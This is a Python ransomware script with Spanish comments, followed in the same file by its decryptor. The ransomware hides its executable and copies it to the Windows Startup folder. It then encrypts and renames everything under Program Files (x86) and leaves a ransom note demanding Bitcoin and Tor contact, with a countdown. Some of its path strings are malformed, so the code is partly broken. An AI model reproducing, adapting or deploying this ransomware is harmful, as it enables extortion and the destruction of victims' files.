from cryptography.fernet import Fernet
import os
import time



os.system('attrib +s +h C:\Users\Aaron\Downloads\xe-ransom.exe')

os.system('MOVE C:\Users\Aaron\Downloads\xe-ransom.exe C:\Users\Aaron\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')


# Extensión para los archivos encriptados.
extension = 'xeransom'


# Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


# Función para obtener la clave de cifrado del archivo local.
def cargar_key():
    return open('key.key', 'rb').read()


# Función para encriptar los archivos y su renombramiento con la extensión personalizada.
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)


if __name__ == '__main__':

    try:
        # Directorio que vamos a cifrar.
        path_to_encrypt = 'C:\\Program Files (x86)'

        # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt + '\\' + item for item in items]

        # Generación la clave de cifrado y se almacena en una variable.
        generar_key()
        key = cargar_key()

        # Encriptación de los archivos listados.
        encrypt(full_path, key)

        # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
        with open( path_to_encrypt + '\\README.txt', 'w') as file:
            file.write('Los archivos de su systemas han sido encryptados.\n Si quiere recuperar sus archivos realizar pago de 100€ a la direccion de Bitcoin:a0asdd90s788ds8ds78ffsfds89g \n Puedes contactar conmigo en el chat de la siguiente web de TOR, debe instalar dicho navegador para acceder. Codigo para el buscador TOR: 1crhbhjkfdbv483c4398cn')
            
    except Exception as e:
        print(e)


def espera():
    time.sleep(1)

print('Esta terminal muestra el temporizador, cumpla el pago antes de que llegue a 0 el contador.')
num=60
for i in range(1,num+1):
    time.sleep(1)
    print(num-i)


# Extensión para los archivos encriptados.
extension = 'xeransom'


# Función para obtener la contraseña utiliada en el cifrado de los archivos, y almacenada en un archivo en la máqui>
def cargar_key():
    return open('key.key', 'rb').read()

 
# Función para descifrar los archivos afectados y elimionación de la extensión agregada durante el cifrado.
def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        if item.endswith(extension):
 
            item_orig = item.rsplit('.', 1)[0]
            print(item)
            os.rename(item, item_orig)
            item = item_orig

            with open(item, 'rb') as file:
                encrypted_data = file.read()

            decrypted_data = f.decrypt(encrypted_data)

            with open(item, 'wb') as file:
                file.write(decrypted_data)

        else:
            print('Error decrypting "%s"' %str(item))


if __name__ == '__main__':

    try:

        # Directorio que vamos a cifrar.
        path_to_decrypt = 'C:\\Program Files (x86)'

        # Eliminamos el archivo típico con el mensaje solicitando el rescate.
        os.remove(path_to_decrypt + '\\README.txt')

        # Obtener los archvios del directorio para su descifrado y se guarda en una lista.
        items = os.listdir(path_to_decrypt)
        full_path = [path_to_decrypt + '\\' + item for item in items]

        # Obtener la contraseña utiliada para el cifrado.
        key = cargar_key()

        # Desciframos los archivos afectados.
        decrypt(full_path, key)

    except Exception as e:
        print(e)

